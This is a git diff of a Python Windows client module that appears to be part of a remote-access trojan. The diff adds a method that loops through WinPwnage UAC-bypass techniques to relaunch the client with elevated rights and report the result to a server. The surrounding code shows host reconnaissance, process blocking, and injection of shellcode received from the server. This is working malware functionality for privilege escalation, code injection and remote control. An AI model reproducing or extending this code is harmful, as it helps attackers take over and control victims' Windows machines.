@@ -8,18 +8,45 @@ import os
 import platform
 import socket
 import subprocess
+import sys
 import threading
 import time
 
 import pythoncom
 import wmi
 
+from io import StringIO
+
 from src.client.control.control import Control
 from src.client.persistence.windows import Windows as Persistence
 from src.definitions.commands import *
 
+from winpwnage.core.scanner import function as elevate
+from winpwnage.core.error import WinPwnageError
+
 
 class Windows(Control):
+
+    # elevate with WinPwnage
+    def elevate(self):
+        old_stdout = sys.stdout
+
+        # capture stdout for sending back to server
+        sys.stdout = stdout = StringIO()
+
+        for i in range(1, 8):
+            try:
+                elevate(uac=True, persist=False, elevate=False).run(id=str(i), payload=[f"{os.path.realpath(sys.argv[0])}"])
+                break
+            except WinPwnageError:
+                pass
+
+        stdout.seek(0)
+        output = stdout.read()
+        sys.stdout = old_stdout
+
+        self.es.sendall_json(SERVER_ELEVATE_RSP, output)
+
     def get_info(self):
         _hostname = socket.gethostname()
         _platform = f"{platform.system()} {platform.release()}"
@@ -32,7 +59,8 @@ class Windows(Control):
         info = {"username": os.environ["USERNAME"], "hostname": _hostname, "platform": _platform,
                 "is_admin": bool(ctypes.windll.shell32.IsUserAnAdmin()), "architecture": platform.architecture(),
                 "machine": platform.machine(), "processor": platform.processor(),
-                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "is_unix": False}
+                "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8, "is_unix": False,
+                "exec_path": os.path.realpath(sys.argv[0])}
 
         return info
 
@@ -44,11 +72,11 @@ class Windows(Control):
 
         if process in self.disabled_processes.keys() and self.disabled_processes.get(process):
             self.disabled_processes[process] = False
-            self.socket.send_json(SUCCESS, f"process {process} re-enabled")
+            self.es.send_json(SUCCESS, f"process {process} re-enabled")
             return
         else:
             self.disabled_processes[process] = True
-            self.socket.send_json(SUCCESS, f"process {process} disabled")
+            self.es.send_json(SUCCESS, f"process {process} disabled")
 
         # kill process if its running
         subprocess.Popen(["taskkill", "/f", "/im", process], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -80,10 +108,10 @@ class Windows(Control):
 
         threading.Thread(target=block_process, daemon=True).start()
 
-    # tested on x86 and x64, shellcode must be generated using the same architecture as python interpreter
-    # x64 fix from https://stackoverflow.com/questions/60198918/virtualalloc-and-python-access-violation/61258392#61258392
+    # tested on x86 and x64, shellcode must be generated using the same architecture as python interpreter x64 fix
+    # from https://stackoverflow.com/questions/60198918/virtualalloc-and-python-access-violation/61258392#61258392
     def inject_shellcode(self, buffer):
-        shellcode = self.socket.recvall(buffer)
+        shellcode = self.es.recvall(buffer)
 
         pid = os.getpid()
 
@@ -116,6 +144,6 @@ class Windows(Control):
             time.sleep(3)
 
         except Exception as e:
-            self.socket.send_json(ERROR, f"Error injecting shellcode {e}")
+            self.es.send_json(ERROR, f"Error injecting shellcode {e}")
         else:
-            self.socket.send_json(SUCCESS)
+            self.es.send_json(SUCCESS)
